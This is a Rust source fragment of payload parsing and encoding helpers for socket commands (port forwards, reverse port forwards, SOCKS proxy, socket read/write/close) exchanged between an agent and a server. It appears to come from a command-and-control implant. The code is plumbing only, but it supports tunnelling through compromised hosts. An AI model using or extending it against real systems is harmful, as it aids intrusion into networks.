fn raw_socket_error(error: &std::io::Error) -> u32 {
    error.raw_os_error().and_then(|code| u32::try_from(code).ok()).unwrap_or(1)
}

// ─── Payload parsing helpers (LE, server → agent) ───────────────────────────

fn parse_u32_le(buf: &[u8], offset: &mut usize) -> Result<u32, SocketError> {
    if buf.len() < *offset + 4 {
        return Err(SocketError::Parse("buffer too short for u32 LE"));
    }
    let val = u32::from_le_bytes(
        buf[*offset..*offset + 4]
            .try_into()
            .map_err(|_| SocketError::Parse("slice-to-array conversion failed"))?,
    );
    *offset += 4;
    Ok(val)
}

fn parse_bytes_le(buf: &[u8], offset: &mut usize) -> Result<Vec<u8>, SocketError> {
    let len = parse_u32_le(buf, offset)? as usize;
    if buf.len() < *offset + len {
        return Err(SocketError::Parse("buffer too short for payload bytes"));
    }
    let bytes = buf[*offset..*offset + len].to_vec();
    *offset += len;
    Ok(bytes)
}

// ─── Payload encoding helpers (BE, agent → server) ──────────────────────────

fn encode_u32(value: u32) -> Vec<u8> {
    value.to_be_bytes().to_vec()
}

fn encode_bool(value: bool) -> Vec<u8> {
    encode_u32(u32::from(value))
}

fn encode_bytes(value: &[u8]) -> Result<Vec<u8>, SocketError> {
    let len =
        u32::try_from(value.len()).map_err(|_| SocketError::Parse("socket payload too large"))?;
    let mut out = Vec::with_capacity(4 + value.len());
    out.extend_from_slice(&len.to_be_bytes());
    out.extend_from_slice(value);
    Ok(out)
}

fn encode_port_forward_add(
    command: DemonSocketCommand,
    success: bool,
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(command));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_open(
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Open));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_read_success(
    socket_id: u32,
    socket_type: DemonSocketType,
    data: &[u8],
) -> Result<Vec<u8>, SocketError> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(true));
    payload.extend_from_slice(&encode_bytes(data)?);
    Ok(payload)
}

fn encode_socket_read_failure(
    socket_id: u32,
    socket_type: DemonSocketType,
    error_code: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_socket_write_failure(
    socket_id: u32,
    socket_type: DemonSocketType,
    error_code: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Write));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_socket_close(socket_id: u32, socket_type: DemonSocketType) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Close));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload
}

fn encode_socket_connect(success: bool, socket_id: u32, error_code: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Connect));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_socks_proxy_add(
    success: bool,
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyAdd));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload
}

fn encode_socks_proxy_remove(socket_id: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyRemove));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload
}

fn encode_socks_proxy_clear(success: bool) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyClear));
    payload.extend_from_slice(&encode_bool(success));
    payload
}

fn encode_rportfwd_remove(
    socket_id: u32,
    socket_type: DemonSocketType,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardRemove));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_clear(success: bool) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardClear));
    payload.extend_from_slice(&encode_bool(success));
    payload
}

#[cfg(test)]
#[path = "socket_tests.rs"]
mod tests;
